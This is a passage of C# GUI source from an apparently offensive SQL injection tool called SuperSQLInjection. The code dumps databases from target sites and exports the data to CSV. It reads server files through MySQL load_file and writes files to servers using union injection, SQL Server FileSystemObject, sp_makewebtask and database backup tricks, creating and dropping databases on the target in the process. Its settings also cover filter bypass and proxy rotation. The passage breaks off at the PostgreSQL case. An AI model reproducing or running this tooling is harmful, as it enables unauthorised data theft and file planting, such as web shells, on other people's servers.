            {
                lvw.SubItems.Add(config.injectType.ToString());
            }

            lvw.SubItems.Add(config.dbType.ToString());
            lvw.SubItems.Add(config.testPayload);
            lvw.SubItems.Add(DateTime.Now.ToString());

            this.lvw_injectLog.Items.Add(lvw);
        }

        public void selectInjectType(InjectType type)
        {
            this.cbox_basic_injectType.SelectedIndex = (int)type;
            config.injectType = type;
        }
        public void selectDB(String currentDB)
        {
            DBType dbtype = Tools.caseDBType(currentDB);
            int cdb = (int)dbtype;
            if (cdb != 0)
            {
                this.cbox_basic_dbType.SelectedIndex = (int)dbtype;
                this.txt_log.Invoke(new showLogDelegate(log), "自动选择数据库类型完成！", LogLevel.info);
            }
        }

        private void data_dbs_tsl_getDatas_Click(object sender, EventArgs e)
        {
            if (stp.InUseThreads == 0)
            {

                if (!checkConfig())
                {
                    return;
                }
                if (!isSetInjectPoint())
                {
                    return;
                }

                status = 1;
                List<String> list_columns = new List<String>();
                foreach (ColumnHeader ch in this.data_dbs_lvw_data.Columns)
                {
                    list_columns.Add(ch.Text);
                }
                if (list_columns.Count > 0)
                {
                    this.data_dbs_lvw_data.Items.Clear();
                }
                this.currentDataCount = 0;
                this.currentThread = new Thread(new ParameterizedThreadStart(getData));
                this.currentThread.Start(list_columns);
            }
            else
            {
                MessageBox.Show("还有线程未结束，请稍候....");
            }

        }
        public int export = 0;
        private void data_dbs_tsl_exportDatas_Click(object sender, EventArgs e)
        {

            if (export == 0)
            {
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.csv";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    export = 1;
                    Thread eth = new Thread(exportData);
                    eth.Start(saveFileDialog.FileName);
                    this.data_dbs_tsl_exportDatas.Enabled = false;
                }
            }
            else
            {

                MessageBox.Show("请稍候，还有导出任务正在进行！");
            }
            export = 0;
        }

        public void exportData(Object path)
        {
            try
            {
                FileStream fs = new FileStream(path.ToString(), FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs);
                String columns = "";
                foreach (ColumnHeader dc in this.data_dbs_lvw_data.Columns)
                {
                    columns += ("\"" + dc.Text + "\",");
                }
                sw.WriteLine(columns.Substring(0, columns.Length - 1));
                foreach (ListViewItem sv in this.data_dbs_lvw_data.Items)
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (ListViewItem.ListViewSubItem subv in sv.SubItems)
                    {
                        sb.Append("\"" + subv.Text + "\",");
                    }
                    sb.Remove(sb.Length - 1, 1);
                    sw.WriteLine(sb.ToString());
                }
                sw.Close();
                MessageBox.Show("导出完成！");
            }
            catch (Exception e)
            {
                Tools.SysLog("导出数据发生异常！" + e.Message);
                MessageBox.Show("导出数据发生异常！");
            }
            export = 0;
            this.data_dbs_tsl_exportDatas.Enabled = true;
        }

        private void cbox_basic_injectType_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (this.cbox_basic_injectType.SelectedIndex)
            {

                case 0:
                    config.injectType = InjectType.UnKnow;
                    break;

                case 1:
                    config.injectType = InjectType.Blind;
                    break;
                case 2:
                    config.injectType = InjectType.Error;
                    break;
                case 3:
                    config.injectType = InjectType.Union;
                    break;
            }
        }

        private void cbox_basic_dbType_SelectedIndexChanged(object sender, EventArgs e)
        {
            config.dbType = (DBType)this.cbox_basic_dbType.SelectedIndex;
            //文件读取，选择修改
            try
            {
                Type type = Type.GetType("SuperSQLInjection.payload." + config.dbType.ToString());
                MethodInfo mf = type.GetMethod("getShowCanDoFile");
                List<String> list = (List<String>)mf.Invoke(null, null);
                this.file_cbox_readWrite.Items.Clear();
                if (list != null && list.Count > 0)
                {
                    this.file_cbox_readWrite.Enabled = true;
                    this.file_cbox_readWrite.Items.Add("请选择读写文件方式");
                    this.file_cbox_readWrite.Items.AddRange(list.ToArray());
                }
                else
                {
                    this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");
                }
            }
            catch (Exception ee)
            {

                this.file_cbox_readWrite.Items.Clear();
                this.file_cbox_readWrite.Items.Add("此数据库类型暂不支持文件读写！");
                Tools.SysLog("info：方法不存在----：" + ee.Message);
            }
            this.file_cbox_readWrite.SelectedIndex = 0;
            //加载环境变量

            loadVersToListView(config.dbType);

            //DB2/Informix填充模板显示是否运行设置
            if (DBType.DB2.Equals(config.dbType) || DBType.Informix.Equals(config.dbType))
            {
                this.txt_inject_unionTemplate.Enabled = true;
                this.txt_inject_unionColumnsCount.Enabled = false;
                this.txt_inject_showIndex.Enabled = false;
            }
            else
            {
                this.txt_inject_unionTemplate.Enabled = false;
                this.txt_inject_unionColumnsCount.Enabled = true;
                this.txt_inject_showIndex.Enabled = true;
            }

            ////Informix判断时间默认固定为5秒。
            if (DBType.Informix.Equals(config.dbType))
            {
                this.txt_inject_key.Text = "5";
                config.maxTime = 5;
                this.txt_log.Invoke(new showLogDelegate(log), "Informix延时注入，无法设置延时时间，内置延时语句一般都会执行5秒以上，所以默认设置5秒时间，如果正常响应接近5秒，可以观察日志响应时间，并稍微调大一些！", LogLevel.info);
            }

        }

        public void loadVersToListView(DBType dbtype)
        {
            List<String> vers = null;
            try
            {
                Type type = Type.GetType("SuperSQLInjection.payload." + config.dbType.ToString());
                if (type != null)
                {
                    vers = (List<String>)type.GetField("vers").GetValue(null);
                }
            }
            catch (Exception e)
            {
                Tools.SysLog("loadVersToListView异常：" + e.Message);
            }

            this.data_lvw_ver.Items.Clear();
            if (vers != null && vers.Count > 0)
            {
                foreach (String ver in vers)
                {
                    String[] cvers = ver.Split(DBVers_Splite_Str);
                    ListViewItem lvi = new ListViewItem(cvers[0]);
                    lvi.Tag = cvers[1];
                    this.data_lvw_ver.Items.Add(lvi);
                }
            }

        }
        private void txt_inject_unionColumnsCount_TextChanged(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(this.txt_inject_unionColumnsCount.Text))
            {
                config.columnsCount = int.Parse(this.txt_inject_unionColumnsCount.Text);
            }

        }

        private void txt_inject_showColumn_TextChanged(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(this.txt_inject_showIndex.Text))
            {
                config.showColumn = int.Parse(this.txt_inject_showIndex.Text);
            }
        }

        private void txt_inject_key_TextChanged(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(this.txt_inject_key.Text))
            {
                config.key = this.txt_inject_key.Text;
                config.maxTime = Tools.convertToInt(config.key);
                if (config.maxTime == 0 && config.keyType.Equals(KeyType.Time))
                {
                    MessageBox.Show("输入的判断值不是数字，请重新输入判断值，单位秒！");
                }
            }
        }

        private void tsmi_seting_Click(object sender, EventArgs e)
        {
            Seting set = new Seting(this);
            set.ShowDialog();
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {

            try
            {
                XML.saveConfig(AppDomain.CurrentDomain.BaseDirectory + "/lastConfig.xml", this.config);
            }
            catch (Exception ex)
            {
                Tools.SysLog("保存配置发生错误！" + ex.Message);
            }

            try
            {
                String proxypath = AppDomain.CurrentDomain.BaseDirectory + "/proxy/proxy.xml";
                XML.saveObject(proxypath, proxy);
            }
            catch (Exception ex)
            {
                Tools.SysLog("保存代理配置发生错误！" + ex.Message);
            }

            try
            {
                String proxypath = AppDomain.CurrentDomain.BaseDirectory + "/proxy/proxylist.txt";
                File.Delete(proxypath);
                FileTool.SaveProxyList(proxypath, this.proxy_List.Values);
            }
            catch (Exception ex)
            {
                Tools.SysLog("保存代理池发生错误！" + ex.Message);
            }

            Environment.Exit(0);
        }

        private void tsmi_about_Click(object sender, EventArgs e)
        {
            About ab = new About();
            ab.ShowDialog();
        }

        private void tsmi_mustRead_Click(object sender, EventArgs e)
        {
            Waring w = new Waring();
            w.ShowDialog();
        }

        private void chk_inject_foward_302_CheckedChanged(object sender, EventArgs e)
        {
            config.is_foward_302 = this.chk_inject_foward_302.Checked;
        }


        private void btn_exportConfig_Click(object sender, EventArgs e)
        {

        }

        private void chk_openURLEncoding_CheckedChanged(object sender, EventArgs e)
        {
            config.isOpenURLEncoding = this.chk_openURLEncoding.Checked;
        }

        private void data_cms_tsmi_copyVerValue_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.data_lvw_ver.SelectedItems.Count > 0)
                {
                    StringBuilder sb = new StringBuilder();

                    for (int i = 0; i < this.data_lvw_ver.SelectedItems[0].SubItems.Count; i++)
                    {
                        sb.Append(this.data_lvw_ver.SelectedItems[0].SubItems[i].Text + "\t");
                    }
                    if (sb.Length > 1)
                    {
                        sb.Remove(sb.Length - 1, 1);
                    }
                    Clipboard.SetText(sb.ToString());
                    MessageBox.Show("复制成功！");
                }
            }
            catch
            {
                MessageBox.Show("复制失败，可能粘贴板被其他软件占用！");
            }

        }

        private void data_cms_tsmi_stopGetVariable_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void data_dbs_tsmi_getTableNames_Click(object sender, EventArgs e)
        {
            TreeNode tn = this.data_tvw_dbs.SelectedNode;
            if (tn != null)
            {
                tn.BeginEdit();
            }
        }

        private void chk_useSSL_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_useSSL.Checked)
            {
                config.useSSL = true;
                this.txt_basic_port.Text = "443";
            }
            else
            {
                config.useSSL = false;
                this.txt_basic_port.Text = "80";
            }
        }

        private void data_dbs_tsmi_stopGetInfos_Click(object sender, EventArgs e)
        {
            StopThread();

        }

        private void data_tvw_dbs_AfterCheck(object sender, TreeViewEventArgs e)
        {
            String cname = e.Node.Text;
            Boolean isColumn = e.Node.Tag.ToString().Equals("column");
            Boolean isTable = e.Node.Tag.ToString().Equals("table");
            Boolean isDB = e.Node.Tag.ToString().Equals("dbs");
            if (!e.Node.Checked)
            {
                if (isDB || isTable)
                {
                    //不选
                    foreach (TreeNode tn in e.Node.Nodes)
                    {
                        if (tn.Checked)
                        {
                            tn.Checked = false;
                        }

                    }
                }
                if (isColumn)
                {

                    foreach (ColumnHeader dc in this.data_dbs_lvw_data.Columns)
                    {
                        if (dc.Text.Equals(cname))
                        {
                            this.data_dbs_lvw_data.Columns.Remove(dc);
                            if (data_dbs_lvw_lvwColumnSorter != null)
                            {
                                data_dbs_lvw_lvwColumnSorter.OrderOfSort = SortOrder.None;
                                data_dbs_lvw_lvwColumnSorter.SortColumn = 0;
                            };
                        }

                    }
                }
            }
            else
            {
                if (isTable)
                {
                    foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
                    {
                        if (tn.Checked && tn != e.Node.Parent)
                        {
                            tn.Checked = false;
                        }

                    }
                }

                if (isColumn)
                {

                    foreach (TreeNode tn in e.Node.Parent.Parent.Nodes)
                    {
                        if (tn.Checked && tn != e.Node.Parent)
                        {
                            tn.Checked = false;
                        }

                    }
                    e.Node.Parent.Checked = true;

                    if (!this.curren_table.Equals(e.Node.Parent.Text))
                    {
                        this.data_dbs_lvw_data.Columns.Clear();
                    }
                    ColumnHeader ch = new ColumnHeader("col_" + cname);
                    bool isExists = false;
                    foreach (ColumnHeader dc in this.data_dbs_lvw_data.Columns)
                    {
                        if (dc.Text.Equals(cname))
                        {
                            isExists = true;
                            break;
                        }

                    }
                    if (!isExists)
                    {
                        ch.Text = cname;
                        this.data_dbs_lvw_data.Columns.Add(ch);
                    }
                    //设置当前数据库和表
                    this.curren_db = e.Node.Parent.Parent.Text;
                    this.curren_table = e.Node.Parent.Text;
                }
            }
        }

        private void data_tvw_dbs_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (e.Node.Checked)
            {
                e.Node.Checked = false;
            }
            else
            {
                e.Node.Checked = true;
            }
        }

        private void data_dbs_lvw_tsmi_stop_Click(object sender, EventArgs e)
        {
            StopThread();
        }

        private void txt_basic_host_TextChanged(object sender, EventArgs e)
        {
            config.domain = this.txt_basic_host.Text;
        }

        private void txt_basic_port_TextChanged(object sender, EventArgs e)
        {
            config.port = Tools.convertToInt(this.txt_basic_port.Text);
        }

        private void txt_inject_request_TextChanged(object sender, EventArgs e)
        {
            int s = this.txt_inject_request.SelectionStart;
            config.request = this.txt_inject_request.Text.Replace(HTTP.CT, HTTP.ST).Replace(HTTP.ST, HTTP.CT);
            this.txt_inject_request.Text = config.request;
            this.txt_inject_request.SelectionStart = s;
        }

        private void chk_inject_reverseKey_CheckedChanged(object sender, EventArgs e)
        {
            config.reverseKey = this.chk_inject_reverseKey.Checked;
        }

        private void tsmi_openConfig_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = "XML文件(*.xml)|*.*" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                this.config = XML.readConfig(ofd.FileName);
                reloadConfig(this.config);
                MessageBox.Show("加载配置成功！");
            }
        }

        public void reloadConfig(Config config)
        {

            this.txt_basic_host.Text = config.domain;
            this.txt_basic_port.Text = config.port + "";
            this.cbox_basic_timeOut.Text = config.timeOut + "";
            this.cbox_basic_encoding.Text = config.encoding;
            this.chk_sencondInject.Checked = config.sencondInject;
            this.cbox_basic_injectType.SelectedIndex = (int)config.injectType;
            this.cbox_basic_dbType.SelectedIndex = (int)(config.dbType);

            if (String.IsNullOrEmpty(config.db_encoding))
            {
                config.db_encoding = "UTF-8";
            }
            if (String.IsNullOrEmpty(config.encoding))
            {
                config.encoding = "UTF-8";
            }
            this.data_dbs_cob_db_encoding.Text = config.db_encoding;
            this.cbox_basic_threadSize.Text = config.threadSize + "";
            this.cbox_basic_reTryCount.Text = config.reTry + "";
            this.txt_inject_key.Text = config.key;
            this.chk_inject_foward_302.Checked = config.is_foward_302;
            this.chk_inject_reverseKey.Checked = config.reverseKey;
            this.cbox_inject_type.SelectedIndex = (int)(config.keyType);

            if (config.keyType.Equals(KeyType.Time))
            {
                config.maxTime = Tools.convertToInt(config.key);
            }

            this.chk_openURLEncoding.Checked = config.isOpenURLEncoding;
            this.chk_useSSL.Checked = config.useSSL;
            this.txt_inject_unionColumnsCount.Text = config.columnsCount + "";
            this.txt_inject_showIndex.Text = config.showColumn + "";
            this.txt_inject_unionTemplate.Text = config.unionFillTemplate;


            this.txt_inject_request.Text = config.request;

            //token
            this.token_txt_http_request.Text = config.token_request;

            this.token_txt_startStr.Text = config.token_startStr;
            this.token_txt_endStr.Text = config.token_endStr;

            //二次注入
            this.txt_sencond_request.Text = config.sencondRequest;


            //file

            this.cbox_file_readFileEncoding.Text = config.readFileEncoding;

            //cmd
            this.cmd_chk_showCmdResult.Checked = config.showCmdResult;

            //bypass
            this.bypass_chk_inculdeStr.Checked = config.inculdeStr;
            this.cob_keyRepalce.SelectedIndex = config.keyReplace;
            this.cbox_base64Count.SelectedIndex = config.base64Count;
            this.cbox_bypass_urlencode_count.SelectedIndex = config.urlencodeCount - 1;
            this.bypass_chk_usebetween.Checked = config.useBetweenByPass;
            this.bypass_hex.Checked = config.usehex;
            this.bypass_chk_use_unicode.Checked = config.useUnicode;

            //proxy
            this.proxy_cmb_proxyMode.SelectedIndex = config.proxy_mode;

            //替换字符
            this.chk_reaplaceBeforURLEncode.Checked = config.reaplaceBeforURLEncode;
            String[] replaceStrs = Regex.Split(config.replaceStrs, "\\n");
            config.replaceStrs = config.replaceStrs.Replace("\t\n", "");
            if (replaceStrs.Length > 0)
            {

                foreach (String line in replaceStrs)
                {
                    String[] strs = Regex.Split(line, "\\t");
                    if (strs.Length == 2)
                    {
                        if (!String.IsNullOrEmpty(strs[0]) && !this.replaceList.Contains(strs[0]))
                        {
                            this.replaceList.Add(strs[0], strs[1]);
                            ListViewItem lvi = new ListViewItem(strs[0]);
                            lvi.SubItems.Add(strs[1]);
                            lvi.Name = strs[1];
                            this.bypass_lvw_replaceString.Items.Add(lvi);
                        }
                    }
                }

            }

            this.bypass_cbox_sendHTTPSleepTime.Text = config.sendHTTPSleepTime + "";
            this.bypass_cbox_randIPToHeader.Text = config.randIPToHeader;
        }

        public FindString fs = null;
        public void showFindString(object sender, KeyEventArgs e, RichTextBox textBox)
        {
            if (e.Control && e.KeyCode == Keys.F)
            {
                if (fs == null || fs.IsDisposed)
                {
                    fs = new FindString();
                    fs.TopMost = true;
                    fs.Show();
                    fs.txtbox = textBox;
                }
                else
                {
                    fs.txtbox = textBox;
                    fs.Show();
                }
            }
        }


        private void log_txt_response_KeyDown(object sender, KeyEventArgs e)
        {
            showFindString(sender, e, this.log_txt_response);
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((RichTextBox)sender).SelectAll();
            }
        }
        public void selectAll(object sender, KeyEventArgs e)
        {

            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((RichTextBox)sender).SelectAll();
            }
        }
        private void txt_inject_request_KeyDown(object sender, KeyEventArgs e)
        {
            showFindString(sender, e, this.txt_inject_request);
            selectAll(sender, e);
        }

        private void data_dbs_lvw_tsmi_copyLineData_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.data_dbs_lvw_data.SelectedItems.Count > 0)
                {
                    ListViewItem lvi = this.data_dbs_lvw_data.SelectedItems[0];
                    StringBuilder str = new StringBuilder();
                    foreach (ListViewItem.ListViewSubItem clvi in lvi.SubItems)
                    {
                        str.Append(clvi.Text + "----");
                    }
                    if (str.Length > 0)
                    {
                        //清空剪切板内容
                        Clipboard.Clear();
                        //复制内容到剪切板
                        Clipboard.SetData(DataFormats.Text, str.Remove(str.Length - 4, 4));
                        MessageBox.Show("复制成功！");
                    }

                }
            }
            catch
            {
                MessageBox.Show("复制失败，可能粘贴板被其他软件占用！");
            }

        }

        private void tsmi_saveConfig_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "XML文件|*.xml";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                XML.saveConfig(saveFileDialog.FileName, config);
                MessageBox.Show("导出成功！");
            }
        }

        private void tsmi_update_Click(object sender, EventArgs e)
        {
            new Thread(checkUpdate).Start();
        }
        private void updateStatus()
        {
            this.runTime++;
            this.status_lbl_time.Text = this.runTime + "s";
            this.status_lbl_threadStatus.Text = stp.InUseThreads + "/" + this.cbox_basic_threadSize.Text;

            getDBStatus();
            this.status_lbl_dbsCount.Text = this.currentDbsCount + "/" + this.dbsCount;
            this.status_lbl_tableCount.Text = this.currentTableCount + "/" + this.tableCount;
            if (this.currentDataCount == 0)
            {
                this.currentDataCount = this.data_dbs_lvw_data.Items.Count;
            }
            this.status_lbl_dataCount.Text = this.currentDataCount + "/" + this.dataCount;
            if (stp.InUseThreads <= 0)
            {
                this.status_lbl_runStatus.Text = "未开始";
            }
            else
            {

                this.status_lbl_runStatus.Text = "正在运行";
            }
            this.status_lbl_all_status.Text = comm_currentCount + "/" + comm_count;
            this.lbl_packsCount.Text = HTTP.index.ToString();

        }
        private void timer_status_Tick(object sender, EventArgs e)
        {
            this.Invoke(new delegateVoid(updateStatus));

        }

        public void getDBStatus()
        {

            this.currentDbsCount = 0;
            this.currentTableCount = 0;
            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {

                if ("dbs".Equals(tn.Tag))
                {

                    this.currentDbsCount++;
                    foreach (TreeNode ctn in tn.Nodes)
                    {

                        if ("table".Equals(ctn.Tag))
                        {

                            this.currentTableCount++;
                        }
                    }
                }
            }
        }
        String[] ver_tmp = null;
        public void file_txt_resultSetText(String text)
        {
            this.file_txt_result.Text = text;
        }

        public void file_txt_resultAppendText(String text)
        {
            this.file_txt_result.AppendText(text + "\r\n");
        }

        public void cmd_txt_resultSetText(String text)
        {
            this.cmd_txt_result.Text = text;
        }

        public void readOrWriteFile()
        {
            String path = this.file_txt_filePath.Text;
            String path_16 = Tools.strToHex(path, "UTF-8");
            String data_payload = "";
            this.dataCount = 0;
            if (Thread.CurrentThread.Name == null)
            {
                Thread.CurrentThread.Name = "FileThread-";
            }

            switch (config.dbType)
            {

                case DBType.MySQL:
                    if (this.file_cbox_readWrite.SelectedIndex == 1)
                    {
                        data_payload = MySQL.hex.Replace("{data}", "load_file(" + path_16 + ")");
                        switch (config.injectType)
                        {
                            case InjectType.Blind:
                                try
                                {
                                    if (String.IsNullOrEmpty(config.key))
                                    {
                                        MessageBox.Show("大侠，请在注入中心，配置Bool盲注的判断值！");
                                        return;
                                    }
                                    String payload_len = MySQL.ver_length.Replace("{data}", data_payload);
                                    int len = 0;
                                    //延时注入
                                    if (config.keyType.Equals(KeyType.Time))
                                    {
                                        len = getValueByStepUp(MySQL.getBoolCountBySleep(payload_len, config.maxTime), 0, 50000);
                                    }
                                    else
                                    {
                                        len = getValueByStepUp(payload_len, 0, 50000);
                                    }

                                    this.dataCount = len;
                                    String value = "";
                                    ver_tmp = new String[len];
                                    //获取值
                                    for (int i = 0; i < len; i++)
                                    {
                                        stp.WaitFor(100);
                                        stp.QueueWorkItem<string>(readOrWriteFileByMySQLByHexAscii, data_payload + "#" + i);
                                    }
                                    stp.WaitForIdle();
                                    if (ver_tmp != null)
                                    {
                                        value = Tools.unHex(Tools.convertToString(ver_tmp), config.readFileEncoding);
                                    }
                                    this.Invoke(new StringDelegate(file_txt_resultSetText), value);
                                    this.txt_log.Invoke(new showLogDelegate(log), this.file_cbox_readWrite.Text + "完成！", LogLevel.success);

                                }
                                catch (Exception e)
                                {
                                    this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
                                }
                                break;
                            case InjectType.Union:
                                try
                                {
                                    if (config.columnsCount <= 0)
                                    {
                                        MessageBox.Show("大侠，请在注入中心，配置Union注入的列数！");
                                        return;
                                    }

                                    String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", MySQL.creatMySQLReadFileByUnion(config.columnsCount, config.showColumn, config.unionFill, "convert(load_file(" + path_16 + ") using UTF8)")));
                                    this.dataCount = result.Length;
                                    this.currentDataCount = result.Length;
                                    this.Invoke(new StringDelegate(file_txt_resultSetText), result);
                                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，获取到文件数据!", LogLevel.success);
                                }
                                catch (Exception e)
                                {
                                    this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
                                }
                                break;
                            case InjectType.Error:
                                try
                                {
                                    String payload_len = MySQL.char_length.Replace("{data}", data_payload);
                                    String payload_len_error = MySQL.error_value.Replace("{data}", MySQL.concatMySQLColumn(payload_len));

                                    String result_length = getOneDataByUnionOrError(payload_len_error);


                                    int sumlen = Tools.convertToInt(result_length);
                                    this.dataCount = sumlen;
                                    String result = "";

                                    int start = 1;
                                    //每次获取长度，err方式有长度限制
                                    int count = 64 - 6;
                                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！", LogLevel.info);
                                    while (start < sumlen)
                                    {
                                        //hex编码，防止中文等乱码
                                        String datas_value_tmp = ByPassForBetween(MySQL.concatMySQLColumn(MySQL.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
                                        String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_tmp);
                                        result += getOneDataByUnionOrError(c_datas_value_payload);
                                        start += count;
                                        this.currentDataCount = result.Length;
                                        this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.unHex(result, config.readFileEncoding));
                                    }
                                    //查找格式^^^col$$$col^^^
                                    result = Tools.unHex(result, config.readFileEncoding);
                                    Match m = Regex.Match(result, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
                                    if (m.Success)
                                    {
                                        result = m.Value;
                                    }
                                    this.Invoke(new StringDelegate(file_txt_resultSetText), result);
                                    this.txt_log.Invoke(new showLogDelegate(log), "获取文件内容！", LogLevel.info);
                                }
                                catch (Exception e)
                                {

                                    this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
                                }
                                break;

                        }
                    }
                    else if (this.file_cbox_readWrite.SelectedIndex == 2)
                    {
                        //union方式写文件
                        if (config.injectType.Equals(InjectType.Union))
                        {
                            if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                            {
                                String payload = MySQL.creatMySQLWriteFileByUnion(config.columnsCount, config.showColumn, config.unionFill, path, this.file_txt_result.Text);
                                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                            }
                            else
                            {
                                MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
                            }
                        }
                        else
                        {

                            MessageBox.Show("大侠此种方式写文件，只支持Union注入！");
                        }
                    }
                    break;

                case DBType.SQLServer:
                    if (this.file_cbox_readWrite.SelectedIndex == 1)
                    {
                        //filesystemobject写文件
                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                        {
                            String payload = SQLServer.witeFileByFileSystemObject.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                        }
                        else
                        {
                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
                        }

                    }
                    else if (this.file_cbox_readWrite.SelectedIndex == 2)
                    {
                        //sp_makewebtask写文件
                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                        {
                            String payload = SQLServer.witeFileBySP_MakeWebTask.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                        }
                        else
                        {
                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
                        }

                    }
                    else if (this.file_cbox_readWrite.SelectedIndex == 3)
                    {
                        //backup database写文件
                        if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                        {
                            String payload = SQLServer.witeFileByBackDataBase.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
                            //删库删表
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            //建库建表
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.createWriteFileBackUpDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.createWriteFileBackUpTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                            //执行备份写
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            //删库删表
                            HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropWriteFileBackUpTableAndDropDB, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                            MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                        }
                        else
                        {
                            MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
                        }

                    }
                    else if (this.file_cbox_readWrite.SelectedIndex == 4)
                    {
                        //filesystemobject读文件
                        String payload = SQLServer.readFileByFileSystemobject.Replace("{path}", path);
                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, SQLServer.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        switch (config.injectType)
                        {
                            case InjectType.Blind:

                                //取每一列的值
                                data_payload = SQLServer.file_content;
                                String payload_len = SQLServer.bool_dataLength.Replace("{data}", data_payload);
                                int len = 0;
                                if (config.keyType.Equals(KeyType.Time))
                                {
                                    len = getValue(SQLServer.getBoolDataBySleep(payload_len, config.maxTime), 0, 1024 * 100);
                                }
                                else
                                {
                                    len = getValue(payload_len, 0, 1024 * 100);
                                }

                                ver_tmp = new String[len];
                                this.dataCount = len;
                                this.txt_log.Invoke(new showLogDelegate(log), "读到文件内容，长度为" + len + "字节！", LogLevel.info);
                                //获取值
                                for (int i = 1; i <= len; i++)
                                {
                                    stp.QueueWorkItem<object>(getFileContentBoolBySQLServer, i);
                                    this.currentDataCount = i;
                                }
                                stp.WaitForIdle();
                                break;

                            case InjectType.Union:
                                String unionresult = getOneDataByUnionOrError(SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.file_content));
                                this.Invoke(new StringDelegate(file_txt_resultSetText), unionresult);
                                this.txt_log.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + unionresult.Length + "字节！", LogLevel.info);
                                break;
                            case InjectType.Error:

                                String errorresult = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.file_content));
                                this.Invoke(new StringDelegate(file_txt_resultSetText), errorresult);
                                this.txt_log.Invoke(new showLogDelegate(log), "获取到读取的文件内容，长度为" + errorresult.Length + "字节！", LogLevel.info);
                                break;
                        }
                    }
                    break;

                case DBType.PostgreSQL:
